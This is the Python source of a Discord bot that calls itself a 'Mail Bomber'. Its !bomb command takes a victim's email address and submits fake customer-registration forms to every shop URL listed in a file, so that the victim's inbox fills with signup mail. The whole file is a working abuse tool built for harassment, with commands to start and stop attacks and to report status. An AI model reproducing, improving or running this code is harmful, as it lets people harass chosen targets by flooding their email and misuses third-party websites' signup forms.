import discord
from discord.ext import commands
import random
import string
import requests
from concurrent.futures import ThreadPoolExecutor
import asyncio
import logging
intents = discord.Intents.default()
intents.typing = False
intents.presences = False
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)
bombing_jobs = {}
allowed_channel_id = 1134152240974794772

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    if message.channel.id != allowed_channel_id:
        return

    await bot.process_commands(message)

@bot.command()
async def bomb(ctx, email):
    global bombing_jobs

    if ctx.author.id in bombing_jobs:
        await ctx.send("You already have a bombing job in progress.")
        return

    try:
        with open("urls.txt", "r") as file:
            urls = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        await ctx.send("Error: urls.txt not found.")
        return

    random.shuffle(urls)

    try:
        with open("blacklist.txt", "r") as file:
            blacklist = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        blacklist = []

    if email in blacklist:
        await ctx.send("Email is blacklisted. Bombing aborted.")
        return

    total_requests = len(urls)

    embed = discord.Embed(title=":bomb: Bombing :bomb:", color=discord.Color.red())
    embed.add_field(name="Attacking", value=email, inline=False)
    embed.add_field(name="Domains", value=f"0/{total_requests}", inline=False)
    embed.set_footer(text="Only do 1 attack per mail. Doing more has no effect.")

    progress_message = await ctx.send(embed=embed)

    def send_request(url):
        rnd = ''.join(random.choices(string.ascii_letters, k=8))
        rnd2 = ''.join(random.choices(string.ascii_letters, k=5))
        password = ''.join(random.choices(string.ascii_letters, k=12))

        data = {
            'form_type': 'create_customer',
            'utf8': '✓',
            'customer[first_name]': rnd,
            'customer[last_name]': rnd2,
            'customer[email]': email,
            'customer[password]': password
        }

        try:
            response = requests.post(url, data=data, timeout=3)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            print(f"Error occurred while sending request to {url}: {e}")
        time.sleep(0.2)

    async def update_progress():
        sent_requests = 0
        with ThreadPoolExecutor() as executor:
            loop = asyncio.get_event_loop()
            futures = [loop.run_in_executor(executor, send_request, url) for url in urls]

            while sent_requests < total_requests:
                sent_requests += 1
                embed.set_field_at(1, name="Domains", value=f"{sent_requests}/{total_requests}", inline=False)
                await progress_message.edit(embed=embed)

    bombing_jobs[ctx.author.id] = bot.loop.create_task(update_progress())







@bot.command()
async def stop(ctx):
    global bombing_jobs

    if ctx.author.id not in bombing_jobs:
        await ctx.send("You don't have any bombing job in progress.")
        return

    bombing_jobs[ctx.author.id].cancel()
    del bombing_jobs[ctx.author.id]
    await ctx.send("Bombing stopped.")

@bot.command()
async def bothelp(ctx):
    embed = discord.Embed(title="Mail Bomber Commands", color=discord.Color.blue())
    embed.add_field(name="Displays our commands", value="!commands", inline=False)
    embed.add_field(name="Get the backend status", value="!status", inline=False)
    embed.add_field(name="Bomb spams the target", value="!bomb [email]", inline=False)
    embed.set_footer(text="Only one bombing job per user at a time.")

    await ctx.send(embed=embed)

@bot.command()
async def commands(ctx):
    embed = discord.Embed(title="Available Commands", color=discord.Color.blue())
    embed.add_field(name="!bomb [email]", value="Starts a bombing job for the specified email.", inline=False)
    embed.add_field(name="!stop", value="Stops the current bombing job.", inline=False)
    embed.add_field(name="!bothelp", value="Displays the help message.", inline=False)
    embed.add_field(name="!status", value="Displays the backend status.", inline=False)

    await ctx.send(embed=embed)

@bot.command()
async def status(ctx):
    try:
        with open("urls.txt", "r") as file:
            urls = [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        await ctx.send("Error: urls.txt not found.")
        return

    total_requests = len(urls)

    embed = discord.Embed(title=":white_check_mark: STATUS :white_check_mark:", color=discord.Color.green())
    embed.add_field(name="Our backend currently has", value=f"{total_requests} Domains loaded.")

    await ctx.send(embed=embed)

with open("token.txt", "r") as token_file:
    token = token_file.read().strip()

bot.run(token)
